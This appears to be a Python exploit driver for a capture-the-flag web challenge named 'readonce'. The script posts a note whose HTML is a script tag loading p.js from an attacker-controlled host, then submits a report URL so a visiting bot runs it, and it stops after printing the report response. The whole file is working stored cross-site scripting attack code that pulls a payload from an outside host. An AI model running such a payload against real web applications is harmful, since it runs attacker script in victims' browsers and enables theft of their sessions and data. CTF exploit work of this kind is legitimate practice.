#!/usr/bin/env python3
"""readonce driver: create the note, fire the report, wait for the flag."""
import sys, time, re, threading, urllib.parse, requests

APP = sys.argv[1].rstrip('/')
PUB = sys.argv[2].rstrip('/')
ATTACKER_STATE = sys.argv[3] if len(sys.argv) > 3 else None

payload = f'<script src="{PUB}/p.js"></script>'
assert len(payload) <= 128, f'payload too long: {len(payload)}'
print(f'[*] payload ({len(payload)} chars): {payload}')

s = requests.Session()
r = s.post(f'{APP}/create', data={'title': 'doc', 'html': payload}, allow_redirects=False, timeout=15)
loc = r.headers.get('Location', '')
note_id = loc.rsplit('/', 1)[-1]
print(f'[*] note id = {note_id}  (HTTP {r.status_code} -> {loc})')

report_url = f'{PUB}/go?note={urllib.parse.quote(note_id)}'
print(f'[*] report url = {report_url}')

out = {}
def fire():
    try:
        rr = requests.post(f'{APP}/report', data={'url': report_url}, timeout=90)
        out['status'] = rr.status_code
        out['body'] = re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', rr.text))[:200]
    except Exception as e:
        out['err'] = str(e)

t = threading.Thread(target=fire); t.start()
t.join(90)
print(f'[*] /report -> {out}')
